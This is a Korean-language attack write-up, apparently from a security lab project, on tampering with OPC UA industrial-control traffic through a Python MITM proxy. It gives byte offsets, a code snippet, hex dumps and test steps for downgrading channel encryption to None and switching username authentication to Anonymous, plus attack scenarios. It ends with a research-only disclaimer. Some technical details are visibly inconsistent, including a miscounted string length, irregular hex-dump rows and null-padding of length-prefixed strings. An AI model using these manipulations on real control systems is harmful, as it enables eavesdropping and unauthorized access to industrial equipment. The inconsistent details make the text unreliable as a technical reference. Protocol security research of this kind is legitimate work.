# OPC UA 패킷 조작 세부사항

## 개요

Python socket 기반 MITM 프록시를 통해 OPC UA 메시지를 실시간으로 분석하고 조작합니다.

## 조작 대상 메시지

### 1. OpenSecureChannelRequest

**목적:** 보안 채널 설정을 평문 통신으로 다운그레이드

**조작 필드:**
- 오프셋: 28-31 바이트 (4 바이트)
- 필드명: SecurityMode
- 데이터 타입: UInt32 (little-endian)

**값 변조:**
```
원본 값: 0x00000003 (MessageSecurityMode.SignAndEncrypt)
변조 값: 0x00000001 (MessageSecurityMode.None)
```

**바이너리 표현:**
```
원본: 03 00 00 00
변조: 01 00 00 00
```

### 2. GetEndpointsResponse

**목적:** 서버가 제공하는 보안 정책을 None으로 다운그레이드

**조작 필드:**
- 필드명: SecurityPolicyUri (String)
- 데이터 타입: UTF-8 문자열

**값 변조:**
```
원본 값: "http://opcfoundation.org/UA/SecurityPolicy#Basic256Sha256"
변조 값: "http://opcfoundation.org/UA/SecurityPolicy#None"
```

**문자열 치환:**
- 길이를 맞추기 위해 null 바이트 패딩 사용
- Basic256Sha256 (16자) → None + padding

### 3. ActivateSessionRequest

**목적:** 사용자 인증을 Anonymous로 우회

**조작 필드 1 - TokenType:**
- 오프셋: UserIdentityToken 구조체 내부
- 필드명: TokenType
- 데이터 타입: UInt32

**값 변조:**
```
원본 값: 0x00000001 (UserTokenType.Username)
변조 값: 0x00000000 (UserTokenType.Anonymous)
```

**조작 필드 2 - PolicyId:**
- 필드명: PolicyId
- 데이터 타입: String

**값 변조:**
```
원본 값: "username_basic256sha256"
변조 값: "anonymous"
```

## 조작 기법 요약표

| 메시지 타입              | 필드              | 원본 값                | 변조 값         | 오프셋      |
|-------------------------|-------------------|------------------------|----------------|-------------|
| OpenSecureChannel       | SecurityMode      | 0x03 (SignAndEncrypt)  | 0x01 (None)    | 28-31       |
| GetEndpointsResponse    | SecurityPolicyUri | Basic256Sha256         | None           | 가변        |
| ActivateSession         | TokenType         | 0x01 (Username)        | 0x00 (Anonymous)| 가변        |
| ActivateSession         | PolicyId          | username_basic256sha256| anonymous      | 가변        |

## 구현 방법

### 프록시 아키텍처

```
클라이언트 <---> MITM Proxy <---> 서버
             (포트 14841)      (포트 4841)
```

### 패킷 처리 흐름

1. **수신:** 클라이언트/서버로부터 데이터 수신
2. **파싱:** OPC UA 메시지 타입 식별
3. **조작:** 타겟 필드 값 변경
4. **전달:** 변조된 데이터 전송
5. **로깅:** 조작 내역 기록

### 핵심 코드 스니펫

```python
def manipulate_open_secure_channel(self, data):
    """SecurityMode 필드 변조"""
    if len(data) > 31:
        security_mode = struct.unpack('<I', data[28:32])[0]
        
        if security_mode == 0x03:  # SignAndEncrypt
            modified = bytearray(data)
            modified[28:32] = struct.pack('<I', 0x01)  # None
            return bytes(modified)
    
    return data
```

## 바이너리 페이로드 예시

### OpenSecureChannelRequest (조작 전)

```
Offset  Hex                                           ASCII
------  --------------------------------------------  ----------------
0x0000  4F 50 4E 46 5C 00 00 00 68 74 74 70 3A 2F 2F  OPNF\...http://
0x0010  6F 70 63 66 6F 75 6E 64 61 74 69 6F 6E 2E 6F  opcfoundation.o
0x001C  03 00 00 00  <- SecurityMode (SignAndEncrypt)
```

### OpenSecureChannelRequest (조작 후)

```
Offset  Hex                                           ASCII
------  --------------------------------------------  ----------------
0x0000  4F 50 4E 46 5C 00 00 00 68 74 74 70 3A 2F 2F  OPNF\...http://
0x0010  6F 70 63 66 6F 75 6E 64 61 74 69 6F 6E 2E 6F  opcfoundation.o
0x001C  01 00 00 00  <- SecurityMode (None)
```

## 테스트 방법

### 1. 프록시 시작

```bash
python3 step2_mitm_proxy_advanced.py
```

### 2. 클라이언트 연결

```python
from opcua import Client
client = Client("opc.tcp://localhost:14841")
client.connect()
```

### 3. 조작 확인

프록시 로그에서 다음 메시지 확인:
```
[MANIPULATION] OpenSecureChannel: SecurityMode
   Original: 0x03 (SignAndEncrypt)
   Modified: 0x01 (None)

[MANIPULATION] ActivateSession detected
   Original: TokenType=Username, PolicyId=username_basic256sha256
   Modified: TokenType=Anonymous, PolicyId=anonymous
```

## 공격 시나리오

### 시나리오 1: 보안 채널 다운그레이드

1. 클라이언트가 암호화된 채널 요청
2. 프록시가 SecurityMode를 None으로 변경
3. 서버는 평문 통신 허용
4. 공격자가 모든 트래픽 도청

### 시나리오 2: 인증 우회

1. 클라이언트가 Username/Password 인증 시도
2. 프록시가 TokenType을 Anonymous로 변경
3. 서버가 인증 없이 세션 활성화
4. 공격자가 무단 접근 성공

## 보안 권고사항

이 기술은 다음 목적으로만 사용되어야 합니다:

1. 연구 및 교육 목적
2. 자체 시스템 보안 평가
3. 취약점 분석 및 패치 검증

**무단 사용은 불법입니다.**

## 참고문헌

- OPC UA Specification Part 6: Mappings
- OPC UA Specification Part 4: Services
- RFC 2119: Key words for use in RFCs

